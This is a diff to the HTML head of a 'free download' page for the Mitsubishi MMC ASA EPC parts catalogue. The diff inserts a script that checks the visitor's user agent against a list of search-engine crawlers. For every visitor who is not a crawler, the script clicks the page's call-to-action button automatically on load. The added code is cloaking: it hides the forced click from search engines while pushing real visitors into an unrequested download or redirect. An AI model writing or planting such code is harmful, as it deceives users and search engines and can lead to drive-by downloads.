@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Mitsubishi MMC ASA EPC 06.2024 (General + Europe + USA + Japan)</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Mitsubishi MMC ASA EPC 06.2024 for Europe, USA, General, and Japan. Compatible with Windows 7, 8, 10; free download available.">
     <meta name="keywords" content="Mitsubishi MMC ASA EPC 2024, Mitsubishi MMC ASA EPC, MMC ASA spare parts catalog, Mitsubishi EPC 2024, Mitsubishi MMC ASA EPC download, Mitsubishi MMC ASA EPC download free, Mitsubishi MMC EPC 2024 free download, Mitsubishi MMC ASA EPC Europe, Mitsubishi MMC ASA EPC USA, Mitsubishi MMC ASA EPC Japan, Mitsubishi MMC ASA EPC General, Mitsubishi parts catalog 2024, Mitsubishi ASA parts software, Mitsubishi ASA catalog Europe 2024, MMC ASA catalog download, MMC ASA 2024 free download, MMC ASA EPC catalogue free download, каталог запчастей Mitsubishi MMC ASA 2024, каталог запчастей MMC ASA EPC, MMC ASA Европейский каталог запчастей, MMC ASA каталог США, MMC ASA каталог Япония, MMC ASA скачать каталог, MMC ASA EPC скачать бесплатно, MMC ASA 2024 бесплатная загрузка, MMC ASA EPC каталог, MMC ASA программное обеспечение 2024, MMC ASA каталог запчастей, MMC ASA 2024 загрузка, каталог запчастин Mitsubishi MMC ASA 2024, каталог запчастин MMC ASA EPC, MMC ASA Європейський каталог запчастин, MMC ASA каталог США, MMC ASA каталог Японія, MMC ASA завантажити каталог, MMC ASA EPC завантажити безкоштовно, MMC ASA 2024 безкоштовне завантаження, MMC ASA EPC каталог 2024, MMC ASA програмне забезпечення 2024, MMC ASA каталог запчастин, MMC ASA 2024 завантаження">
     <style>
